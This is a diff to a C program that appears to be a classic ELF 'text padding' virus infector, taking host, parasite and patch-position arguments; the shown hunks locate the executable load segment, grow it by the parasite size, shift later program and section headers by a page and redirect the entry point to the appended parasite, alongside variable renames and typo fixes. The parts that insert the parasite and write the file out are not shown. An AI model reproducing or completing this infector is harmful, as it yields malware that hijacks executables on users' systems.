@@ -18,6 +18,20 @@ struct stat hst, pst;
 
 int main(int argc, char **argv)
 {
+    unsigned long entry_point, text_offset, text_begin;
+    unsigned char *mem;
+    unsigned int entry_offset;
+    unsigned char buf[PAGE_SIZE];
+    unsigned int ehdr_size;
+    int ofd;
+    int psize;
+    int text_found;
+    Elf32_Ehdr *ehdr;
+    Elf32_Phdr *phdr;
+    Elf32_Shdr *shdr;
+    int i;
+
+
     if (argc != 4)
     {
         printf("usage: %s <host> <parasite> <patch-position>\n", argv[0]);
@@ -50,19 +64,6 @@ int main(int argc, char **argv)
         exit(-1);
     }
 
-    unsigned long entry_point, text_offset, text_begin;
-    unsigned char *mem;
-    unsigned int entry_offset;
-    unsigned char buf[PAGE_SIZE];
-    unsigned int ehdr_size;
-    int ofd;
-    int psize;
-    int text_found;
-    Elf32_Ehdr *e_hdr;
-    Elf32_Phdr *p_hdr;
-    Elf32_Shdr *s_hdr;
-    int i;
-
 
     psize = pst.st_size;
 
@@ -73,59 +74,59 @@ int main(int argc, char **argv)
         exit(-1);
     }
 
-    e_hdr = (Elf32_Ehdr *) mem;
-    entry_point = e_hdr->e_entry;
-    ehdr_size = sizeof(*e_hdr);
+    ehdr = (Elf32_Ehdr *) mem;
+    entry_point = ehdr->e_entry;
+    ehdr_size = sizeof(*ehdr);
 
 
-    if (!(e_hdr->e_ident[0] == 0x7f && strcmp(&e_hdr->e_ident[1], "ELF")))
+    if (!(ehdr->e_ident[0] == 0x7f && strcmp(&ehdr->e_ident[1], "ELF")))
     {
         printf("host is not an ELF\n");
         exit(-1);
     }
 
     text_found = 0;
-    p_hdr = (Elf32_Phdr *) (mem + e_hdr->e_phoff);
+    phdr = (Elf32_Phdr *) (mem + ehdr->e_phoff);
 
     // iterate over phdrs looking for the text segment
-    for (i = e_hdr->e_phnum; i-- > 0; p_hdr++)
+    for (i = ehdr->e_phnum; i-- > 0; phdr++)
     {
-        if (text_found) //&& p_hdr->p_offset >= entry_offset)
+        if (text_found) //&& phdr->p_offset >= entry_offset)
         {
-            p_hdr->p_offset += PAGE_SIZE;
+            phdr->p_offset += PAGE_SIZE;
         }
 
-        if (p_hdr->p_type == PT_LOAD)
-            if (p_hdr->p_flags == (PF_R | PF_X))
+        if (phdr->p_type == PT_LOAD)
+            if (phdr->p_flags == (PF_R | PF_X))
             {
                 text_found++;
-                text_offset = p_hdr->p_offset; // offset of text segment on file
-                text_begin = p_hdr->p_vaddr; 
-                entry_offset = p_hdr->p_filesz; // offset to parasite entry point
-                p_hdr->p_filesz += psize;
-                p_hdr->p_memsz += psize;
+                text_offset = phdr->p_offset; // offset of text segment on file
+                text_begin = phdr->p_vaddr; 
+                entry_offset = phdr->p_filesz; // offset to parasite entry point
+                phdr->p_filesz += psize;
+                phdr->p_memsz += psize;
             }
     }
 
 
-    s_hdr = (Elf32_Shdr *) (mem + e_hdr->e_shoff);
-    for (i = e_hdr->e_shnum; i-- > 0; s_hdr++)
+    shdr = (Elf32_Shdr *) (mem + ehdr->e_shoff);
+    for (i = ehdr->e_shnum; i-- > 0; shdr++)
     {
-        if (s_hdr->sh_offset >= text_offset + entry_offset)
+        if (shdr->sh_offset >= text_offset + entry_offset)
         {
-            s_hdr->sh_offset += PAGE_SIZE;
+            shdr->sh_offset += PAGE_SIZE;
         }
     }
 
     // push section header table
-    e_hdr->e_shoff += PAGE_SIZE;
+    ehdr->e_shoff += PAGE_SIZE;
 
     // modify entry_point to point to parasite at the end of .text
-    e_hdr->e_entry = text_begin + entry_offset;
+    ehdr->e_entry = text_begin + entry_offset;
 
-    if (psize > PAGE_SIZW)
+    if (psize > PAGE_SIZE)
     {
-        printf("parasite too large\n")
+        printf("parasite too large\n");
         exit(-1);
     }
 
